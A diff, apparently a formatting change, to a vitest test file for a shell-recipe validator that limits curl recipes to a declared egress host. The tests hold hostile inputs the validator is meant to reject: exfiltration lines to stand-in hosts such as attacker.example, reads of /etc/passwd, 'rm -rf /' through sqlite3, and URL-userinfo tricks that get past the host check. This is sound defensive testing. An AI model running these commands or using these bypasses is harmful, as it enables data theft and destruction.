@@ -1,5 +1,8 @@
 import { describe, it, expect } from "vitest"
-import { parseBindings, validateRecipe } from "../../../src/modules/qa/binding-parser.js"
+import {
+  parseBindings,
+  validateRecipe,
+} from "../../../src/modules/qa/binding-parser.js"
 
 const SAMPLE_PLAN = `
 # Test Plan
@@ -42,7 +45,12 @@ describe("parseBindings", () => {
     const token = result.bindings[0]!
     expect(token.name).toBe("QA_BIND_TOKEN")
     expect(token.type).toBe("secret")
-    expect(token.inputs).toEqual(["TEST_USER_EMAIL", "TEST_USER_PASSWORD", "SUPABASE_URL", "ANON_KEY"])
+    expect(token.inputs).toEqual([
+      "TEST_USER_EMAIL",
+      "TEST_USER_PASSWORD",
+      "SUPABASE_URL",
+      "ANON_KEY",
+    ])
     expect(token.egress).toBe("$SUPABASE_URL")
     expect(token.recipe).toContain("curl -sS")
     expect(token.recipe).toContain("jq -er .access_token")
@@ -100,7 +108,9 @@ New endpoint with statuses 200 and 504.
   })
 
   it("returns ok with empty bindings when no **Bindings:** subsection", () => {
-    const result = parseBindings("# Plan\n\n## Setup\n\n**Required environment variables:**\n- \`X\`\n")
+    const result = parseBindings(
+      "# Plan\n\n## Setup\n\n**Required environment variables:**\n- \`X\`\n",
+    )
     expect(result.status).toBe("ok")
     if (result.status === "ok") {
       expect(result.bindings).toEqual([])
@@ -216,37 +226,55 @@ describe("validateRecipe — single-statement constraint (Rule 1)", () => {
     expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
   })
   it("rejects ; chained statements", () => {
-    expect(validateRecipe(`curl "$URL"; rm /tmp/x`, "$URL").status).toBe("error")
+    expect(validateRecipe(`curl "$URL"; rm /tmp/x`, "$URL").status).toBe(
+      "error",
+    )
   })
   it("rejects && chained statements", () => {
-    expect(validateRecipe(`curl "$URL" && curl "http://evil"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl "$URL" && curl "http://evil"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects || chained statements", () => {
-    expect(validateRecipe(`curl "$URL" || curl "http://evil"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl "$URL" || curl "http://evil"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects newline-separated statements", () => {
-    expect(validateRecipe(`curl "$URL"\ncurl "http://evil"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl "$URL"\ncurl "http://evil"`, "$URL").status,
+    ).toBe("error")
   })
   it("accepts \\<newline> line continuation as single statement", () => {
-    expect(validateRecipe(`curl "$URL" \\\n  -H "X: y" | jq -er .x`, "$URL").status).toBe("ok")
+    expect(
+      validateRecipe(`curl "$URL" \\\n  -H "X: y" | jq -er .x`, "$URL").status,
+    ).toBe("ok")
   })
 })
 
 describe("validateRecipe — operator allowlist (Rule 2)", () => {
   it("rejects $() command substitution", () => {
-    expect(validateRecipe(`curl "$URL" -d "$(cat /etc/passwd)"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl "$URL" -d "$(cat /etc/passwd)"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects backticks", () => {
-    expect(validateRecipe('curl "$URL" -d "`cat /etc/passwd`"', "$URL").status).toBe("error")
+    expect(
+      validateRecipe('curl "$URL" -d "`cat /etc/passwd`"', "$URL").status,
+    ).toBe("error")
   })
   it("rejects heredoc <<", () => {
     expect(validateRecipe(`cat <<EOF\nx\nEOF`, "$URL").status).toBe("error")
   })
   it("rejects > redirect to non-/dev/null", () => {
-    expect(validateRecipe(`curl "$URL" > /tmp/leak`, "$URL").status).toBe("error")
+    expect(validateRecipe(`curl "$URL" > /tmp/leak`, "$URL").status).toBe(
+      "error",
+    )
   })
   it("accepts 2>/dev/null", () => {
-    expect(validateRecipe(`curl "$URL" 2>/dev/null | jq -er .x`, "$URL").status).toBe("ok")
+    expect(
+      validateRecipe(`curl "$URL" 2>/dev/null | jq -er .x`, "$URL").status,
+    ).toBe("ok")
   })
   it("rejects & background", () => {
     expect(validateRecipe(`curl "$URL" &`, "$URL").status).toBe("error")
@@ -256,14 +284,19 @@ describe("validateRecipe — operator allowlist (Rule 2)", () => {
     // single-statement check and is not caught by the trailing-& guard, so the
     // egress allowlist only ever sees the first command's URL.
     expect(
-      validateRecipe(`curl -s "$URL" & curl -s https://attacker.example/?t=$TOKEN`, "$URL").status,
+      validateRecipe(
+        `curl -s "$URL" & curl -s https://attacker.example/?t=$TOKEN`,
+        "$URL",
+      ).status,
     ).toBe("error")
   })
   it("rejects unquoted & inside a URL (real shell backgrounds the curl)", () => {
     expect(validateRecipe(`curl $URL/?a=1&b=2`, "$URL").status).toBe("error")
   })
   it("accepts an & that is part of a quoted URL query string", () => {
-    expect(validateRecipe(`curl -sS "$URL/?a=1&b=2" | jq -er .x`, "$URL").status).toBe("ok")
+    expect(
+      validateRecipe(`curl -sS "$URL/?a=1&b=2" | jq -er .x`, "$URL").status,
+    ).toBe("ok")
   })
 })
 
@@ -281,16 +314,24 @@ describe("validateRecipe — command allowlist (Rule 3)", () => {
 
 describe("validateRecipe — curl flag denylist", () => {
   it("rejects --upload-file", () => {
-    expect(validateRecipe(`curl --upload-file /etc/passwd "$URL"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl --upload-file /etc/passwd "$URL"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects -T file", () => {
-    expect(validateRecipe(`curl -T /etc/passwd "$URL"`, "$URL").status).toBe("error")
+    expect(validateRecipe(`curl -T /etc/passwd "$URL"`, "$URL").status).toBe(
+      "error",
+    )
   })
   it("rejects -d @file", () => {
-    expect(validateRecipe(`curl -d @/etc/passwd "$URL"`, "$URL").status).toBe("error")
+    expect(validateRecipe(`curl -d @/etc/passwd "$URL"`, "$URL").status).toBe(
+      "error",
+    )
   })
   it("rejects --data @file", () => {
-    expect(validateRecipe(`curl --data @secrets.txt "$URL"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl --data @secrets.txt "$URL"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects -o non-null", () => {
     expect(validateRecipe(`curl -o /tmp/x "$URL"`, "$URL").status).toBe("error")
@@ -299,16 +340,22 @@ describe("validateRecipe — curl flag denylist", () => {
     expect(validateRecipe(`curl -o /dev/null "$URL"`, "$URL").status).toBe("ok")
   })
   it("accepts --data-urlencode 'inline'", () => {
-    expect(validateRecipe(`curl --data-urlencode "email=$X" "$URL"`, "$URL").status).toBe("ok")
+    expect(
+      validateRecipe(`curl --data-urlencode "email=$X" "$URL"`, "$URL").status,
+    ).toBe("ok")
   })
 })
 
 describe("validateRecipe — Egress URL match (Rule 4)", () => {
   it("accepts curl to declared Egress host", () => {
-    expect(validateRecipe(`curl "$URL/path" | jq -er .x`, "$URL").status).toBe("ok")
+    expect(validateRecipe(`curl "$URL/path" | jq -er .x`, "$URL").status).toBe(
+      "ok",
+    )
   })
   it("rejects curl to a different literal host", () => {
-    expect(validateRecipe(`curl "https://evil.example/path"`, "$URL").status).toBe("error")
+    expect(
+      validateRecipe(`curl "https://evil.example/path"`, "$URL").status,
+    ).toBe("error")
   })
   it("rejects curl to a different $VAR host when Egress is $URL", () => {
     expect(validateRecipe(`curl "$OTHER/path"`, "$URL").status).toBe("error")
@@ -384,17 +431,14 @@ describe("validateRecipe — awk/sed shell-exec primitives", () => {
 
   it("rejects awk when piped from an allowed command", () => {
     expect(
-      validateRecipe(
-        `curl "$URL" | awk 'BEGIN{system("id")}'`,
-        "$URL",
-      ).status,
+      validateRecipe(`curl "$URL" | awk 'BEGIN{system("id")}'`, "$URL").status,
     ).toBe("error")
   })
 
   it("rejects sed when piped from an allowed command", () => {
-    expect(
-      validateRecipe(`curl "$URL" | sed 's/x/y/'`, "$URL").status,
-    ).toBe("error")
+    expect(validateRecipe(`curl "$URL" | sed 's/x/y/'`, "$URL").status).toBe(
+      "error",
+    )
   })
 })
 
@@ -410,13 +454,15 @@ describe("validateRecipe — DSN egress validation", () => {
 
   it("accepts psql when the DSN matches the declared Egress", () => {
     expect(
-      validateRecipe(`psql "$DATABASE_URL" -c "select 1"`, "$DATABASE_URL").status,
+      validateRecipe(`psql "$DATABASE_URL" -c "select 1"`, "$DATABASE_URL")
+        .status,
     ).toBe("ok")
   })
 
   it("rejects sqlite3 .read dot-command (executes SQL from arbitrary file)", () => {
     expect(
-      validateRecipe(`sqlite3 ./local.db ".read /etc/passwd"`, "./local.db").status,
+      validateRecipe(`sqlite3 ./local.db ".read /etc/passwd"`, "./local.db")
+        .status,
     ).toBe("error")
   })
 
@@ -428,7 +474,8 @@ describe("validateRecipe — DSN egress validation", () => {
 
   it("rejects sqlite3 .system dot-command", () => {
     expect(
-      validateRecipe(`sqlite3 ./local.db ".system rm -rf /"`, "./local.db").status,
+      validateRecipe(`sqlite3 ./local.db ".system rm -rf /"`, "./local.db")
+        .status,
     ).toBe("error")
   })
 })
@@ -438,25 +485,35 @@ describe("validateRecipe — egress allowlist bypass via URL userinfo", () => {
     // `https://api.host.com@evil.com/x` resolves to host `evil.com`; the
     // userinfo segment `api.host.com` must NOT be treated as the host.
     expect(
-      validateRecipe("curl https://api.host.com@evil.com/x", "https://api.host.com").status,
+      validateRecipe(
+        "curl https://api.host.com@evil.com/x",
+        "https://api.host.com",
+      ).status,
     ).toBe("error")
   })
 
   it("rejects userinfo with a password component", () => {
     expect(
-      validateRecipe("curl https://egress.example.com:pw@attacker.com/?d=x", "https://egress.example.com").status,
+      validateRecipe(
+        "curl https://egress.example.com:pw@attacker.com/?d=x",
+        "https://egress.example.com",
+      ).status,
     ).toBe("error")
   })
 
   it("rejects a psql DSN whose userinfo spoofs the Egress host", () => {
     expect(
-      validateRecipe("psql postgres://db.host.com@attacker.example/db", "postgres://db.host.com").status,
+      validateRecipe(
+        "psql postgres://db.host.com@attacker.example/db",
+        "postgres://db.host.com",
+      ).status,
     ).toBe("error")
   })
 
   it("still accepts a plain curl URL that matches the declared Egress host", () => {
     expect(
-      validateRecipe("curl https://api.host.com/x", "https://api.host.com").status,
+      validateRecipe("curl https://api.host.com/x", "https://api.host.com")
+        .status,
     ).toBe("ok")
   })
 
@@ -464,16 +521,16 @@ describe("validateRecipe — egress allowlist bypass via URL userinfo", () => {
     // `$URL@evil.example/x` collapses to the same `$URL` token on both sides
     // of the egress equality check, but curl treats the allowlisted host as
     // userinfo and connects to `evil.example`.
-    expect(
-      validateRecipe('curl "$URL@evil.example/x"', "$URL").status,
-    ).toBe("error")
+    expect(validateRecipe('curl "$URL@evil.example/x"', "$URL").status).toBe(
+      "error",
+    )
   })
 
   it("rejects a var-template URL whose suffix extends the host segment", () => {
     // `$URL.evil.example/x` expands to `…evil.example`, not the egress host.
-    expect(
-      validateRecipe('curl "$URL.evil.example/x"', "$URL").status,
-    ).toBe("error")
+    expect(validateRecipe('curl "$URL.evil.example/x"', "$URL").status).toBe(
+      "error",
+    )
   })
 
   it("still accepts a var-template URL with a legitimate path/query suffix", () => {
@@ -497,9 +554,9 @@ describe("validateRecipe — file-reader path confinement", () => {
   })
 
   it("rejects cut on an absolute system path", () => {
-    expect(
-      validateRecipe(`cut -d: -f1 /etc/passwd`, "$URL").status,
-    ).toBe("error")
+    expect(validateRecipe(`cut -d: -f1 /etc/passwd`, "$URL").status).toBe(
+      "error",
+    )
   })
 
   it("rejects grep on an absolute system path", () => {
@@ -507,15 +564,13 @@ describe("validateRecipe — file-reader path confinement", () => {
   })
 
   it("rejects tr reading an absolute system path", () => {
-    expect(
-      validateRecipe(`tr a-z A-Z < /etc/hostname`, "$URL").status,
-    ).toBe("error")
+    expect(validateRecipe(`tr a-z A-Z < /etc/hostname`, "$URL").status).toBe(
+      "error",
+    )
   })
 
   it("accepts file-reader with no path argument (stdin pipeline)", () => {
-    expect(
-      validateRecipe(`curl "$URL" | head -n 1`, "$URL").status,
-    ).toBe("ok")
+    expect(validateRecipe(`curl "$URL" | head -n 1`, "$URL").status).toBe("ok")
   })
 
   it("accepts file-reader on a ./ relative path", () => {
@@ -533,7 +588,7 @@ describe("validateRecipe — recipe length cap (regex DoS)", () => {
   it("rejects recipes longer than 16 KB", () => {
     // 16 KB + a token — exact cap is implementation detail, we just need a
     // large input to be rejected before the regex pipeline scans it.
-    const huge = "curl \"$URL\" -H \"" + "x".repeat(20_000) + "\""
+    const huge = 'curl "$URL" -H "' + "x".repeat(20_000) + '"'
     const result = validateRecipe(huge, "$URL")
     expect(result.status).toBe("error")
     if (result.status === "error") {
@@ -542,8 +597,6 @@ describe("validateRecipe — recipe length cap (regex DoS)", () => {
   })
 
   it("accepts recipes well under the cap", () => {
-    expect(
-      validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status,
-    ).toBe("ok")
+    expect(validateRecipe(`curl "$URL" | jq -er .x`, "$URL").status).toBe("ok")
   })
 })
